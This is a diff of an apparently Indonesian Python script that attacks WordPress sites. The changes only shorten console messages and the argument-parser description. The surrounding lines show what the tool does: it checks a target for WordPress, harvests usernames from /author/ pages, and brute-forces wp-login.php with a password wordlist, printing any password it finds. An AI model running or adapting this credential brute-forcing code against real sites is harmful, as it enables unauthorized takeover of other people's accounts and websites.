@@ -39,7 +39,7 @@ def test_url(target):
     try:
         response = requests.get(url, headers=HEADERS, timeout=5)
         if response.status_code == 200:
-            print(f"\033[1;32m[✔] WordPress ditemukan di {target}\033[0m")
+            print(f"\033[1;32m[✔] CMS WordPress {target}\033[0m")
         else:
             print(f"\033[1;31m[✘] Gagal mengakses {url} (HTTP {response.status_code})\033[0m")
             exit()
@@ -56,7 +56,7 @@ def user_enum(target):
         match = re.search(r"/author/([^/]+)/", response.text)
         if match:
             username = match.group(1)
-            print(f"\033[1;32m[✔] Ditemukan Username: {username} ({url})\033[0m")
+            print(f"\033[1;32m[✔] Username: {username} ({url})\033[0m")
         sleep(1)
 
 # Brute Force Attack
@@ -83,7 +83,7 @@ def brute_force(target, username, wordlist):
             response = requests.post(f"{target}/wp-login.php", headers=HEADERS, data=data, timeout=5)
 
             if "login_error" not in response.text:
-                print(f"\n\033[1;32m[✔] Password ditemukan: {password}\033[0m")
+                print(f"\n\033[1;32m[✔] Password: {password}\033[0m")
                 break
     print("\n\033[1;33m[!] Brute force selesai.\033[0m")
 
@@ -91,7 +91,7 @@ def brute_force(target, username, wordlist):
 if __name__ == "__main__":
     banner()
     
-    parser = argparse.ArgumentParser(description="WordPress Login Brute Force")
+    parser = argparse.ArgumentParser(description="Bruteforce CMS Wordpress")
     parser.add_argument("-url", required=True, help="Target URL (contoh: http://example.com)")
     parser.add_argument("-u", "--user", help="Username untuk brute force")
     parser.add_argument("-p", "--wordlist", help="Path ke file wordlist")
